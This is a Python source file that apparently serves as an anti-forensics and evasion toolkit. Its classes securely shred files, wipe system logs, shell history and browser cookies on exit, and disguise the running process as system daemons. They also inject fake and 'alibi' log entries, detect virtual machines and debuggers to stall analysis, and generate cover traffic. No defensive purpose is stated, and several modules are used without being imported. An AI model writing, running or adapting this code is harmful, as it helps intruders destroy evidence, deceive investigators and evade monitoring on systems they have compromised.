import os
import shutil
import tempfile
import threading
import time
import random
import hashlib
import json
from typing import Dict, List, Any, Optional
from pathlib import Path
import subprocess
import signal
import atexit
import logging
from datetime import datetime, timedelta
class EvidenceShredder:
    def __init__(self, secure_delete: bool = True):
        self.secure_delete = secure_delete
        self.temp_files = set()
        self.memory_dumps = []
        self.log_files = set()
        self.shred_on_exit = True
        atexit.register(self.emergency_cleanup)
        signal.signal(signal.SIGTERM, self._signal_handler)
        signal.signal(signal.SIGINT, self._signal_handler)
    def _signal_handler(self, signum, frame):
        self.emergency_cleanup()
        os._exit(1)
    def register_temp_file(self, filepath: str):
        self.temp_files.add(filepath)
    def register_log_file(self, filepath: str):
        self.log_files.add(filepath)
    def secure_delete_file(self, filepath: str, passes: int = 3):
        if not os.path.exists(filepath):
            return True
        try:
            file_size = os.path.getsize(filepath)
            with open(filepath, 'rb+') as f:
                for pass_num in range(passes):
                    f.seek(0)
                    if pass_num == 0:
                        pattern = b'\x00' * 4096
                    elif pass_num == 1:
                        pattern = b'\xFF' * 4096
                    else:
                        pattern = bytes([random.randint(0, 255) for _ in range(4096)])
                    written = 0
                    while written < file_size:
                        chunk_size = min(4096, file_size - written)
                        f.write(pattern[:chunk_size])
                        written += chunk_size
                    f.flush()
                    os.fsync(f.fileno())
            os.remove(filepath)
            return True
        except Exception as e:
            try:
                os.remove(filepath)
            except:
                pass
            return False
    def memory_scrubbing(self):
        garbage_data = []
        try:
            for _ in range(100):
                garbage_data.append(bytes([random.randint(0, 255) for _ in range(10240)]))
            for _ in range(50):
                temp_dict = {
                    str(random.randint(0, 999999)): bytes([random.randint(0, 255) for _ in range(1024)])
                    for _ in range(100)
                }
                garbage_data.append(temp_dict)
            time.sleep(0.1)
        except MemoryError:
            pass
        finally:
            del garbage_data
    def clear_system_logs(self):
        log_locations = [
            '/var/log/auth.log',
            '/var/log/syslog',
            '/var/log/messages',
            '/var/log/secure',
            '/var/log/access.log',
            '~/.bash_history',
            '~/.python_history',
            '~/.lesshst'
        ]
        for log_path in log_locations:
            expanded_path = os.path.expanduser(log_path)
            if os.path.exists(expanded_path) and os.access(expanded_path, os.W_OK):
                try:
                    with open(expanded_path, 'w') as f:
                        f.write('')
                except:
                    pass
    def clear_dns_cache(self):
        dns_clear_commands = [
            ['sudo', 'systemctl', 'flush-dns'],
            ['sudo', 'dscacheutil', '-flushcache'],
            ['sudo', 'killall', '-HUP', 'mDNSResponder'],
            ['ipconfig', '/flushdns']
        ]
        for cmd in dns_clear_commands:
            try:
                subprocess.run(cmd, capture_output=True, timeout=5)
            except:
                continue
    def wipe_browser_data(self):
        browser_paths = [
            '~/.mozilla/firefox/*/cookies.sqlite',
            '~/.config/google-chrome/Default/Cookies',
            '~/Library/Safari/Cookies.db',
            '~/AppData/Local/Google/Chrome/User Data/Default/Cookies',
            '~/AppData/Roaming/Mozilla/Firefox/Profiles/*/cookies.sqlite'
        ]
        for pattern in browser_paths:
            expanded = os.path.expanduser(pattern)
            try:
                import glob
                for file_path in glob.glob(expanded):
                    self.secure_delete_file(file_path)
            except:
                continue
    def emergency_cleanup(self):
        if not self.shred_on_exit:
            return
        cleanup_threads = []
        cleanup_threads.append(threading.Thread(target=self._cleanup_temp_files))
        cleanup_threads.append(threading.Thread(target=self._cleanup_logs))
        cleanup_threads.append(threading.Thread(target=self.memory_scrubbing))
        cleanup_threads.append(threading.Thread(target=self.clear_dns_cache))
        for thread in cleanup_threads:
            thread.daemon = True
            thread.start()
        for thread in cleanup_threads:
            thread.join(timeout=2)
    def _cleanup_temp_files(self):
        for temp_file in list(self.temp_files):
            try:
                self.secure_delete_file(temp_file)
            except:
                pass
    def _cleanup_logs(self):
        for log_file in list(self.log_files):
            try:
                self.secure_delete_file(log_file)
            except:
                pass
class ProcessObfuscation:
    def __init__(self):
        self.original_argv = None
        self.original_name = None
    def mask_process_name(self, fake_name: str = None):
        if not fake_name:
            fake_names = [
                'systemd', 'kworker', 'python3', 'curl', 'wget',
                'ssh', 'sshd', 'chrome', 'firefox', 'update-manager'
            ]
            fake_name = random.choice(fake_names)
        try:
            import ctypes
            import ctypes.util
            libc = ctypes.CDLL(ctypes.util.find_library('c'))
            if hasattr(libc, 'prctl'):
                PR_SET_NAME = 15
                libc.prctl(PR_SET_NAME, fake_name.encode(), 0, 0, 0)
            if hasattr(libc, 'setproctitle'):
                libc.setproctitle(fake_name.encode())
        except:
            pass
    def randomize_process_timing(self):
        base_sleep = random.uniform(0.1, 2.0)
        jitter = random.uniform(-0.5, 0.5)
        time.sleep(max(0.01, base_sleep + jitter))
    def create_decoy_processes(self, count: int = 3):
        decoy_processes = []
        decoy_commands = [
            ['sleep', '300'],
            ['ping', '-c', '100', 'google.com'],
            ['curl', '-s', 'http://httpbin.org/delay/60'],
            ['python3', '-c', 'import time; time.sleep(300)']
        ]
        for _ in range(count):
            try:
                cmd = random.choice(decoy_commands)
                proc = subprocess.Popen(
                    cmd,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                decoy_processes.append(proc)
            except:
                continue
        return decoy_processes
    def cleanup_decoy_processes(self, processes: List[subprocess.Popen]):
        for proc in processes:
            try:
                proc.terminate()
                proc.wait(timeout=5)
            except:
                try:
                    proc.kill()
                except:
                    pass
class LogManipulator:
    def __init__(self):
        self.original_logging_level = None
        self.fake_entries = []
    def suppress_logging(self):
        self.original_logging_level = logging.getLogger().getEffectiveLevel()
        logging.getLogger().setLevel(logging.CRITICAL + 1)
        logging.getLogger('requests').setLevel(logging.CRITICAL + 1)
        logging.getLogger('urllib3').setLevel(logging.CRITICAL + 1)
        logging.getLogger('boto3').setLevel(logging.CRITICAL + 1)
        logging.getLogger('botocore').setLevel(logging.CRITICAL + 1)
        logging.getLogger('google').setLevel(logging.CRITICAL + 1)
        logging.getLogger('azure').setLevel(logging.CRITICAL + 1)
    def inject_fake_entries(self, log_file: str):
        fake_activities = [
            "User logged in successfully",
            "System backup completed",
            "Software update check performed",
            "Network connectivity test passed",
            "Cache cleanup completed",
            "Configuration file validation successful",
            "Database maintenance completed",
            "Security scan finished - no issues found"
        ]
        try:
            with open(log_file, 'a') as f:
                for _ in range(random.randint(5, 15)):
                    timestamp = datetime.now() - timedelta(minutes=random.randint(1, 60))
                    activity = random.choice(fake_activities)
                    f.write(f"{timestamp.isoformat()} INFO: {activity}\n")
        except:
            pass
    def create_alibi_logs(self, duration_hours: int = 2):
        alibi_activities = [
            "Browsing documentation",
            "Reading news articles", 
            "Checking email",
            "System maintenance",
            "Software development",
            "Research activities",
            "File organization",
            "Network troubleshooting"
        ]
        temp_log = tempfile.mktemp(suffix='.log')
        try:
            with open(temp_log, 'w') as f:
                start_time = datetime.now() - timedelta(hours=duration_hours)
                current_time = start_time
                while current_time < datetime.now():
                    activity = random.choice(alibi_activities)
                    f.write(f"{current_time.isoformat()} INFO: {activity}\n")
                    current_time += timedelta(minutes=random.randint(5, 30))
            return temp_log
        except:
            return None
    def restore_logging(self):
        if self.original_logging_level is not None:
            logging.getLogger().setLevel(self.original_logging_level)
class AntiAnalysis:
    def __init__(self):
        self.vm_indicators = [
            'VMware', 'VirtualBox', 'QEMU', 'Xen', 'Hyper-V',
            'Parallels', 'KVM', 'Docker', 'Container'
        ]
        self.analysis_tools = [
            'wireshark', 'tcpdump', 'strace', 'ltrace',
            'gdb', 'ida', 'radare2', 'ollydbg', 'x64dbg'
        ]
    def detect_virtualization(self) -> bool:
        detection_methods = [
            self._check_system_info,
            self._check_hardware_info,
            self._check_running_processes,
            self._check_network_interfaces,
            self._check_timing_anomalies
        ]
        vm_score = 0
        for method in detection_methods:
            try:
                if method():
                    vm_score += 1
            except:
                continue
        return vm_score >= 2
    def _check_system_info(self) -> bool:
        try:
            with open('/proc/version', 'r') as f:
                content = f.read().lower()
                return any(indicator.lower() in content for indicator in self.vm_indicators)
        except:
            try:
                result = subprocess.run(['systeminfo'], capture_output=True, text=True, timeout=10)
                content = result.stdout.lower()
                return any(indicator.lower() in content for indicator in self.vm_indicators)
            except:
                return False
    def _check_hardware_info(self) -> bool:
        try:
            with open('/proc/cpuinfo', 'r') as f:
                content = f.read().lower()
                return 'hypervisor' in content or any(indicator.lower() in content for indicator in self.vm_indicators)
        except:
            return False
    def _check_running_processes(self) -> bool:
        try:
            result = subprocess.run(['ps', 'aux'], capture_output=True, text=True, timeout=10)
            processes = result.stdout.lower()
            analysis_indicators = self.analysis_tools + ['debugger', 'monitor', 'analyzer']
            return any(tool in processes for tool in analysis_indicators)
        except:
            return False
    def _check_network_interfaces(self) -> bool:
        try:
            with open('/proc/net/dev', 'r') as f:
                content = f.read().lower()
                vm_interfaces = ['veth', 'vmnet', 'vboxnet']
                return any(interface in content for interface in vm_interfaces)
        except:
            return False
    def _check_timing_anomalies(self) -> bool:
        try:
            start_time = time.perf_counter()
            time.sleep(0.1)
            elapsed = time.perf_counter() - start_time
            return elapsed < 0.05 or elapsed > 0.2
        except:
            return False
    def anti_debugging_sleep(self):
        if self.detect_virtualization():
            time.sleep(random.uniform(300, 600))
    def obfuscate_strings(self, text: str) -> str:
        encoded = base64.b64encode(text.encode()).decode()
        return ''.join(chr(ord(c) + 1) for c in encoded)
    def deobfuscate_strings(self, obfuscated: str) -> str:
        decoded = ''.join(chr(ord(c) - 1) for c in obfuscated)
        return base64.b64decode(decoded.encode()).decode()
class NetworkFootprintReducer:
    def __init__(self):
        self.connection_fingerprints = []
        self.traffic_patterns = {}
    def minimize_tcp_fingerprint(self) -> Dict[str, Any]:
        tcp_options = {
            'window_size': random.choice([8192, 16384, 32768, 65535]),
            'mss': random.choice([1460, 1452, 1440, 1400]),
            'window_scale': random.choice([0, 1, 2, 3, 7]),
            'sack_permitted': random.choice([True, False]),
            'timestamp': random.choice([True, False])
        }
        return tcp_options
    def generate_cover_traffic(self, duration: int = 300):
        cover_sites = [
            'https://www.google.com',
            'https://www.microsoft.com', 
            'https://www.apple.com',
            'https://www.amazon.com',
            'https://www.github.com',
            'https://www.stackoverflow.com'
        ]
        def background_requests():
            end_time = time.time() + duration
            while time.time() < end_time:
                try:
                    site = random.choice(cover_sites)
                    requests.get(site, timeout=10)
                    time.sleep(random.uniform(30, 120))
                except:
                    continue
        thread = threading.Thread(target=background_requests, daemon=True)
        thread.start()
        return thread
    def randomize_request_patterns(self) -> Dict[str, Any]:
        patterns = {
            'user_agent_rotation_interval': random.randint(10, 50),
            'request_interval_base': random.uniform(0.5, 3.0),
            'request_interval_jitter': random.uniform(0.1, 1.0),
            'connection_reuse_probability': random.uniform(0.6, 0.9),
            'parallel_request_probability': random.uniform(0.1, 0.4)
        }
        return patterns